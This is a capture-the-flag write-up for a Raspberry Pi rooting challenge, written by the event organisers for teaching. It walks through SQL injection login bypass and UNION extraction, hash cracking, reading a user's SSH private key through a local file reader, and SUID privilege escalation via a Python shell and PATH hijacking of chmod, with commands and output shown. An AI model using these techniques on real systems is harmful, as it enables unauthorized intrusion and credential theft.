# Raspberry Peist Writeup

This was a challenge me and some other committee members wrote as the main event for our BakeryTF! Users had to root a raspberry Pi to win it, collecting flags along the way. You can view the code [here](https://github.com/ShefESH/BakeryTF/tree/main/Raspberry%20Peist)

## CTF Management Page

First, users had to go to `/robots.txt` on the CTFd platform. The `robots.txt` file points to the `/ctf-management-page` URL, which has the IP of the Raspberry Pi hidden in the source.

Visiting the IP, we see a website that appears to be for managing the CTF. We are presented with a login form:

![[Pasted image 20210619220508.png]]

We can try a few credentials like `admin`:`admin` or `admin`:`shefesh`, but no luck. Let's try some basic SQL Injection - if we submit a single quote `'` to the username field we get an error:

![[Pasted image 20210619220700.png]]

This suggests the page is not sanitising SQL properly. If we imagine the query looks like `SELECT * FROM users WHERE username = uname AND password = pword`, where `uname` and `pword` are user controlled, we may be able to manipulate the query. We can try submitting `' OR 1=1;--` as our username, which should turn the query into `SELECT * FROM users WHERE username = '' OR 1=1;-- AND password = pword`. This matches the first entry in the database and comments out the rest of the query. In theory this should cause the SQL query to select the first user from the database and log us in (the password doesn't matter):

![[Pasted image 20210619220754.png]]

This logs us in as the `admin` user:

![[Pasted image 20210619220834.png]]

Now we're authenticated in the admin panel, we can see a second page, `/admin/search`, which seems to let us search challenges that are part of the CTF:

![[Pasted image 20210619220854.png]]

A message on the page also tells us that the SSH service is running on a non-standard port, `2222`, and that we should login as the `intern` user... once we have a password, of course.

As the login form was vulnerable to SQL Injection, we can try a similar attack on the search form. Search forms are often vulnerable to a `UNION` injection - a search form may run a query such as `SELECT id, title, description FROM challenges WHERE title LIKE '%{input}%';` - we can attempt to inject into the input field to make the query return data from another table, like so: `SELECT id, title, description FROM challenges WHERE title LIKE '%' UNION SELECT id, username, password FROM users;--%';`. To do so, we just submit `' UNION SELECT id, username, password FROM users;--` as our search term:

![[Pasted image 20210619220929.png]]

This then appends a user entry to our results table, containing a password entry, `be49db543011ca91169903c1a3ca2c23`!

The password is hashed - we can try and crack it in [https://crackstation.net/](https://crackstation.net/) - it cracks almost instantly, outputting `chinchilla`.

## Shell as intern

Using the credentials we cracked, we can login as `intern`. We just need to specify the port as `2222` and supply the password, `chinchilla`:

```bash
$ ssh -p 2222 intern@139.162.206.87
The authenticity of host '[139.162.206.87]:2222 ([139.162.206.87]:2222)' can't be established.
ECDSA key fingerprint is SHA256:BlPIOuc0Uidgd2p4WKMbcrxKtW6hFyAx4FN09gJKSn4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[139.162.206.87]:2222' (ECDSA) to the list of known hosts.
intern@139.162.206.87's password:
Last login: Mon May 17 17:54:37 2021 from 192.168.16.1
[intern@SESH-PI ~]$
```

We can also submit this password on CTFd for a flag and some points.

## Shell as master-baker

Now we're `intern` we can read the `user.txt` file to get the next flag:

```bash
[intern@SESH-PI ~]$ cat user.txt
sesh{w3lC0me_t0_ouR_SeRv3r!}
```

Running some basic enumeration on the filesystem, we can see there is a local webserver running on port `9999`:

```bash
[intern@SESH-PI ~]$ ss -lntp
State               Recv-Q              Send-Q                           Local Address:Port                             Peer Address:Port              Process
LISTEN              0                   4096                                 127.0.0.1:9999                                  0.0.0.0:*
LISTEN              0                   4096                                127.0.0.11:45045                                 0.0.0.0:*
LISTEN              0                   128                                    0.0.0.0:22                                    0.0.0.0:*
LISTEN              0                   128                                    0.0.0.0:5000                                  0.0.0.0:*
LISTEN              0                   128                                       [::]:22                                       [::]:*
```

(running a similar command, such as `ps aux`, would also tell us the owner of this process - it turns out to be the `master-baker` user, who we could also have discovered by reading the `/etc/passwd` file or similar)

```bash
[intern@SESH-PI ~]$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           8  0.0  0.1  14776  4792 ?        S    May17   0:00 su master-baker -c cd ~/ && php -S localhost:9999
root           9  0.0  0.1  14776  4540 ?        S    May17   0:00 su flask -c /home/flask/ctf-management/run.sh
master-+      10  0.0  0.5  74428 19704 ?        Ss   May17   0:01 php -S localhost:9999
```

Let's give it a `curl` to see what it does:

```bash
[intern@SESH-PI ~]$ curl http://localhost:9999
<h1>My File Reader</h1>

<a href="/get-file.php">Read My Files!</a>
```

So it looks like it can read a file - as it's owned by `master-baker`, we can likely use it to read their files. But what to read? We can try something that would allow us to escalate privileges... like an `id_rsa` file:

```bash
[intern@SESH-PI ~]$ curl http://localhost:9999/get-file.php?file=.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...[snip]...
tE0bB89AtxC3m1AAAACnRsbEBCSVRCT1g=
-----END OPENSSH PRIVATE KEY-----
```

We got lucky! The webserver was running out of `master-baker`'s home directory, so we could go straight to `.ssh` - if it wasn't, we would have to do some extra enumeration to try and figure out where we were, or just request the file with a full path (`/home/master-baker/.ssh/id_rsa`)

This SSH private key will let us SSH as `master-baker`. Let's copy the key to our local system, then SSH with the following command:

```bash
$ echo [KEY] > master_baker
$ chmod 600 master_baker
$ ssh -p 2222 -i master_baker master-baker@139.162.206.87
[master-baker@SESH-PI ~]$
```

## Shell as Root

Now we're `master-baker` we can have a poke around the file system and grab the user flag:

```bash
[master-baker@SESH-PI ~]$ ls -la
total 56
drwx------ 1 master-baker master-baker 4096 May 15 11:53 .
drwxr-xr-x 1 root         root         4096 May 15 11:53 ..
lrwxrwxrwx 1 master-baker master-baker    9 May 15 11:08 .bash_history -> /dev/null
-rw-r--r-- 1 master-baker master-baker   21 May 12 23:41 .bash_logout
-rw-r--r-- 1 master-baker master-baker   57 May 12 23:41 .bash_profile
-rw-r--r-- 1 master-baker master-baker  141 May 12 23:41 .bashrc
---------- 1 root         root          176 May 15 09:15 .egg
-rwsr-xr-x 1 root         root         9584 May 15 09:18 .egg-cracker
-rw-r--r-- 1 master-baker master-baker  141 May 15 11:53 get-file.php
-rw-r--r-- 1 master-baker master-baker   69 May 15 11:53 index.php
-rw-r--r-- 1 root         root           32 May 15 11:53 master.txt
drwxr-xr-x 1 master-baker master-baker 4096 May 15 11:08 .ssh
[master-baker@SESH-PI ~]$ cat master.txt
sesh{y0u_are_Th3_M45t£r_B4ker}
```

We see a file, `.egg-cracker` that has a SUID bit set (indicated by the `s` in the file permissions). We can see what this is:

```bash
[master-baker@SESH-PI ~]$ file .egg-cracker
.egg-cracker: setuid ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, not stripped
```

Running it gives us a bit more information - we can see it's trying to run `chmod`:

```bash
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?: idk
chmod: invalid mode: ‘idk’
Try 'chmod --help' for more information.
```

We can also look at `.egg`:

```bash
Do not try and crack the egg, that's impossible. Instead, only try to realize
the truth...there is no egg. Then you will see it is not the egg that
cracks, it is the whole pi.
```

As it's owned by root, we can try to give this some useful permissions:

```bash
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?: u+s .egg
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?: 777 .egg
```

These are the new permissions:

```bash
-rwsrwxrwx 1 root         root            3 May 17 18:03 .egg
```

It's now writeable, executable, and crucially has a sticky bit - this means when we execute it, it executes as root!

So we can edit its contents... But to do what? We can't use a plain `/bin/bash`, as bash is [designed for security reasons to drop its privileges](https://focus-linux.securityfocus.narkive.com/L4uQ5nDr/no-root-shell-with-suid-bin-bash) if run with suid (but we can try and see what happens):

```bash
[master-baker@SESH-PI ~]$ cat /bin/bash > .egg
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?: u+s .egg
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?: 777 .egg
[master-baker@SESH-PI ~]$ ./.egg
[master-baker@SESH-PI ~]$ exit
exit
[master-baker@SESH-PI ~]$
```

Instead, we can do a trickier thing, and spawn a shell with python:

```bash
[master-baker@SESH-PI ~]$ cp /usr/bin/python .egg
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?: u+s .egg
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?: +x .egg
[master-baker@SESH-PI ~]$ ./.egg
Python 3.9.5 (default, May 12 2021, 20:31:15)
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> import pty
>>> pty.spawn("/bin/bash")
[root@SESH-PI ~]# cat /root/root.txt
sesh{congr4tuLations_you_W1n_A_RasPB3RRY_P1!}
```

This replaces `.egg` with the python process, lets it run as root, and then uses python to spawn a shell - neat.

### Alternative Solution

Here's what SherlockSec did to root the Pi:

```bash
[master-baker@SESH-PI ~]$ ls -la
total 60
drwx------ 1 master-baker master-baker 4096 May 15 11:53 .
drwxr-xr-x 1 root         root         4096 May 15 11:53 ..
lrwxrwxrwx 1 master-baker master-baker    9 May 15 11:08 .bash_history -> /dev/null
-rw-r--r-- 1 master-baker master-baker   21 May 12 23:41 .bash_logout
-rw-r--r-- 1 master-baker master-baker   57 May 12 23:41 .bash_profile
-rw-r--r-- 1 master-baker master-baker  141 May 12 23:41 .bashrc
-r-xr-xr-x 1 root         root          176 May 15 09:15 .egg
-rwsr-xr-x 1 root         root         9584 May 15 09:18 .egg-cracker
-rw-r--r-- 1 master-baker master-baker  141 May 15 11:53 get-file.php
-rw-r--r-- 1 master-baker master-baker   69 May 15 11:53 index.php
-rw-r--r-- 1 root         root           32 May 15 11:53 master.txt
drwxr-xr-x 1 master-baker master-baker 4096 May 15 11:08 .ssh
[master-baker@SESH-PI ~]$ file .egg
.egg: ASCII text
[master-baker@SESH-PI ~]$ cat .egg
Do not try and crack the egg, that's impossible. Instead, only try to realize
the truth...there is no egg. Then you will see it is not the egg that
cracks, it is the whole pi.
[master-baker@SESH-PI ~]$ file .egg-cracker
.egg-cracker: setuid ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, not stripped
[master-baker@SESH-PI ~]$ strings .egg-cracker
-bash: strings: command not found
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?:
chmod: missing operand
Try 'chmod --help' for more information.
sh: line 2: .egg: command not found
[master-baker@SESH-PI ~]$ $PATH
-bash: /usr/local/sbin:/usr/local/bin:/usr/bin: No such file or directory
[master-baker@SESH-PI ~]$ cd /tmp
[master-baker@SESH-PI tmp]$ echo "/bin/bash" > chmod
[master-baker@SESH-PI tmp]$ chmod 777 chmod
[master-baker@SESH-PI tmp]$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/bin
[master-baker@SESH-PI tmp]$ export PATH=/tmp:$PATH
[master-baker@SESH-PI tmp]$ cd ~
[master-baker@SESH-PI ~]$ ./.egg-cracker
Howdy fella, I can help you crack eggs!
How shall I scramble things?:
[root@SESH-PI ~]# cd /root
[root@SESH-PI root]# ls
root.txt
[root@SESH-PI root]# cat root.txt
sesh{congr4tuLations_you_W1n_A_RasPB3RRY_P1!}
```

This solution makes use of the fact that the `.egg-cracker` file is running `chmod` - by writing their own `chmod` executable and placing it first on the path, running `.egg-cracker` runs the malicious `chmod` instead of the standard one (and does so as root, due to its suid bit). This was a path we hadn't thought of, and just shows off the many dangers of SUID, so congrats to SherlockSec!